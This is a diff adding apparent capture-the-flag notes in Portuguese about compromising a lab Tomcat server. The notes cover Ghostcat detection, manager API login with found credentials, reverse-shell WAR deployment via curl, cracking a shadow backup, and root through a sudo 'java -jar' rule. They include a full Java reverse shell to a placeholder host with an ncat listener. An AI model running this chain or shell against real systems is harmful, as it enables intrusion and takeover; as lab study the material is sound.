@@ -1,0 +1,92 @@
+rustscan:
+
+Open 10.67.133.76:22
+Open 10.67.133.76:8009
+Open 10.67.133.76:8080
+
+nmap:
+
+
+
+Servidor: Apache Tomcat/9.0.30
+versão: 9.0.30 vulnerável ao ghostcat!
+modulo auxiliar para detecção:  auxiliary(admin/http/tomcat_ghostcat)
+
+username:  webdev
+Password: Hgj3LA$02D$Fa@21
+
+login em: manager app -> blocked
+login em host manager -> OK mas sem execução de comandos
+login via API:
+
+[OK] -> curl http://10.67.133.76:8080/manager/text/list -u 'webdev:Hgj3LA$02D$Fa@21'
+OK - Listed applications for virtual host [localhost]
+/:running:0:ROOT
+/examples:running:0:examples
+/host-manager:running:1:host-manager
+/manager:running:0:manager
+/docs:running:0:docs
+
+aplicações listadas! login funcional pela api!
+
+subindo reverse-shell
+
+curl http://10.67.133.76:8080/manager/text/deploy?path=/shell -u 'webdev:Hgj3LA$02D$Fa@21' -T shell.war 
+
+agora a shell ficou em /shell
+
+ja ganhei acesso ao servidor!
+
+--> /home/web/apache-tomcat-9.0.30/conf/tomcat-users.xml --> contem listas de usuários e senhas
+
+-- >em /var/backups tem um arquivo com permissão de leitura chamado: shadow-backup-alt.gz
+mandei ele pra minha máquina e descompressei com: gunzip shadow-backup-alt.gz
+
+quebrei a senha com john
+
+Username: jdk-admin
+Password: 794613852
+
+escalando privilégio para root:
+
+sudo -l
+pediu senha, coloquei a senha quebrada do jdk-admin
+e apareceu:
+    (root) /usr/bin/java -jar *.jar
+
+
+shell em java:
+
+import java.io.*;
+import java.net.Socket;
+
+public class Shell {
+    public static void main(String[] args) throws Exception {
+        String host="SEU_IP";
+        int port=1338;
+        Process p=new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();
+        Socket s=new Socket(host,port);
+        InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
+        OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+        while(!s.isClosed()){
+            while(pi.available()>0) so.write(pi.read());
+            while(pe.available()>0) so.write(pe.read());
+            while(si.available()>0) po.write(si.read());
+            so.flush();
+            po.flush();
+            Thread.sleep(50);
+            try { p.exitValue(); break; } catch (Exception e){}
+        };
+        p.destroy();
+        s.close();
+    }
+}
+
+para funcionar, na maquina rode:
+
+--> javac Shell.java
+--> echo "Main-Class: Shell" > manifest.txt
+--> jar cmvf manifest.txt shell.jar Shell.class
+--> na sua maquina agora abra o listener: ncat -vnlp 1338
+
+virei root e peguei a ultima flag!
